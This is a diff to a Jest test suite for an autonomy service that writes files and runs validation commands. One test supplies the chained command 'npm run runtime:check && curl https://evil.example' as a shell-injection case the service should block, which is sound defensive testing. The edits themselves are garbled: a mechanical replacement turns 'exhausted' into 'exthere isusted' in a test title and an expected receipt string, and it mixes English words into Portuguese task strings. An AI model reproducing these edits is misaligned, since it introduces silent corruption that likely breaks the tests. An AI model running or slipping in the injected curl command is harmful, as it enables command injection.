@@ -126,7 +126,7 @@ describe('ZavorthSpeculativeAutonomyService', () => {
 
     const result = await service.prepare({
       workspaceRoot: root,
-      task: 'Valide sem shell injection',
+      task: 'Validate without shell injection',
       runId: 'run-blocked-command',
       writes: [{ path: 'src/a.ts', content: 'export const value = "new";\n' }],
       validationCommands: ['npm run runtime:check && curl https://evil.example'],
@@ -164,7 +164,7 @@ describe('ZavorthSpeculativeAutonomyService', () => {
 
     const result = await service.prepare({
       workspaceRoot: root,
-      task: 'Troque o valor',
+      task: 'Troque o value',
       runId: 'run-redaction',
       writes: [{ path: 'src/a.ts', content: 'export const value = "new";\n' }],
       validationCommands: ['npm run runtime:check'],
@@ -215,7 +215,7 @@ describe('ZavorthSpeculativeAutonomyService', () => {
 
     const result = await service.prepare({
       workspaceRoot: root,
-      task: 'Valide em Docker',
+      task: 'Validate in Docker',
       runId: 'run-container',
       writes: [{ path: 'src/a.ts', content: 'export const value = "new";\n' }],
       validationCommands: ['npm run runtime:check'],
@@ -340,7 +340,7 @@ describe('ZavorthSpeculativeAutonomyService', () => {
 
     const result = await service.prepare({
       workspaceRoot: root,
-      task: 'Atualize o valor com autocorrecao',
+      task: 'Atualize o value com autocorrection',
       runId: 'run-correction',
       writes: [{ path: 'src/a.ts', content: 'export const value = "bad";\n' }],
       validationCommands: ['npm run runtime:check -- --pretty false'],
@@ -348,7 +348,7 @@ describe('ZavorthSpeculativeAutonomyService', () => {
       maxCorrectionRounds: 1,
       correctionProvider: jest.fn(async () => ({
         writes: [{ path: 'src/a.ts', content: 'export const value = "good";\n' }],
-        summary: 'corrige valor ruim',
+        summary: 'corrige value ruim',
       })),
     });
 
@@ -391,7 +391,7 @@ describe('ZavorthSpeculativeAutonomyService', () => {
 
     const result = await service.prepare({
       workspaceRoot: root,
-      task: 'Atualize com autocorrecao cancelavel',
+      task: 'Atualize com autocorrection cancelavel',
       runId: 'run-cancel',
       writes: [{ path: 'src/a.ts', content: 'export const value = "bad";\n' }],
       validationCommands: ['npm run runtime:check -- --pretty false'],
@@ -407,7 +407,7 @@ describe('ZavorthSpeculativeAutonomyService', () => {
     expect(correctionProvider).not.toHaveBeenCalled();
   });
 
-  it('stops auto-healing correction when the time budget is exhausted', async () => {
+  it('stops auto-healing correction when the time budget is exthere isusted', async () => {
     const root = makeWorkspace({
       'package.json': JSON.stringify({ scripts: { 'runtime:check': 'tsc --noEmit' } }, null, 2),
       'src/a.ts': 'export const value = "old";\n',
@@ -450,7 +450,7 @@ describe('ZavorthSpeculativeAutonomyService', () => {
     expect(result.status).toBe('blocked');
     expect(result.autoHealing.timedOut).toBe(true);
     expect(result.autoHealing.elapsedMs).toBeGreaterThanOrEqual(2_000);
-    expect(result.receipts).toContain('auto-healing-budget-exhausted');
+    expect(result.receipts).toContain('auto-healing-budget-exthere isusted');
     expect(result.finalAttempt?.summary).toContain('budget de tempo excedido');
     expect(correctionProvider).not.toHaveBeenCalled();
   });
